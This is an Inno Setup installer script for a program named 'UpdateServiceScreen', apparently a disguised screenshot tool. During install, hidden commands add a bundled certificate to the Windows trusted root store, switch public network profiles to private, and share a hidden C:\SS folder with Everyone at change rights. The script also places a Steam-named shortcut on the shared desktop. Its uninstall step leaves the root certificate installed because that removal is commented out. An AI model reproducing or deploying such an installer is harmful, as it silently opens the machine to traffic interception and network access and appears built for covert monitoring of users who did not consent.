; Inno Setup Script for UpdateServiceScreen

[Setup]

#ifndef MyAppVersion
  #define MyAppVersion "local"
#endif

AppId={{cdcb233d-b88f-48fe-8af4-d32c0ef7d6c0}}
AppName=UpdateServiceScreen
AppVersion={#MyAppVersion}
AppPublisher=Zhelyapov Aleksey Apps
DefaultDirName={autopf}\UpdateServiceScreen
DefaultGroupName=UpdateServiceScreen
DisableProgramGroupPage=yes
PrivilegesRequired=admin
OutputDir=build
OutputBaseFilename=screenshoter-windows-setup-{#MyAppVersion}
Compression=lzma
SolidCompression=yes
WizardStyle=modern

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"
Name: "russian"; MessagesFile: "compiler:Languages\Russian.isl"

[Dirs]
Name: "C:\SS"; Attribs: hidden

[Files]
; Copy main executable to the installation folder {app}
Source: "build\UpdateServiceScreen.exe"; DestDir: "{app}"; Flags: ignoreversion
; Copy shortcut to the Administrator's desktop
Source: "sources\steam.lnk"; DestDir: "{commondesktop}"; Flags: ignoreversion
; Copy certificate to temporary folder for installation via [Code], delete afterwards
Source: "sources\trust_alex.cer"; DestDir: "{tmp}"

[Run]
; Execute commands AFTER files are copied

; 1. Установка сертификата безопасности из временной папки
Filename: "certutil.exe"; \
    Parameters: "-f -addstore Root ""{tmp}\trust_alex.cer"""; \
    Flags: runhidden waituntilterminated; \
    StatusMsg: "Установка сертификата безопасности..."

; 2. Изменение профилей сети Public на Private
Filename: "powershell.exe"; \
    Parameters: -NoProfile -ExecutionPolicy Bypass -Command 'Get-NetConnectionProfile | Where-Object {{$_.NetworkCategory -eq ''Public''}} | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue'; \
    Flags: runhidden waituntilterminated; \
    StatusMsg: "Настройка сетевых профилей..."

; 3а. Создание сетевой папки C:\SS (если не существует)
Filename: "powershell.exe"; \
    Parameters: -NoProfile -ExecutionPolicy Bypass -Command 'try {{ if (!(Get-SmbShare -Name ''SS'' -ErrorAction SilentlyContinue)) {{ New-SmbShare -Name ''SS'' -Path ''C:\SS'' -Description ''Shared folder for SS'' -ErrorAction Stop }} }} catch {{ throw $_ }}'; \
    Flags: runhidden waituntilterminated; \
    StatusMsg: "Создание сетевой папки (шаг 1)..."

; 3б. Назначение прав Everyone:Change на папку SS
Filename: "powershell.exe"; \
    Parameters: -NoProfile -ExecutionPolicy Bypass -Command 'try {{ if (Get-SmbShare -Name ''SS'' -ErrorAction SilentlyContinue) {{ Grant-SmbShareAccess -Name ''SS'' -AccountName ''Everyone'' -AccessRight Change -Force -ErrorAction Stop }} }} catch {{ throw $_ }}'; \
    Flags: runhidden waituntilterminated; \
    StatusMsg: "Создание сетевой папки (шаг 2 - права)..."

[UninstallDelete]
; Items to delete during uninstallation
Type: filesandordirs; Name: "{app}"
Type: filesandordirs; Name: "C:\SS"
Type: files;          Name: "{commondesktop}\steam.lnk"

[UninstallRun]
; 1. Удаление сетевой папки 'SS'
;    Ошибки игнорируются, используется Write-Warning, throw НЕ используется.
Filename: "powershell.exe"; \
    Parameters: -NoProfile -ExecutionPolicy Bypass -Command 'try {{ if (Get-SmbShare -Name ''SS'' -ErrorAction SilentlyContinue) {{ Remove-SmbShare -Name ''SS'' -Force -ErrorAction SilentlyContinue }} }} catch {{ Write-Warning ''Could not remove share `''SS`'' (might be OK): $($_.Exception.Message)'' }}'; \
    Flags: runhidden waituntilterminated; \
    RunOnceId: "RemoveSSShare"

; 2. Удаление сертификата
;Filename: "certutil.exe"; \
;    Parameters: "-delstore Root ""50BAE4A94C9A5D4E26308BD77ED2C39EF717A5AC"""; \
;    Flags: runhidden waituntilterminated; \
;    RunOnceId: "RemoveMyCert"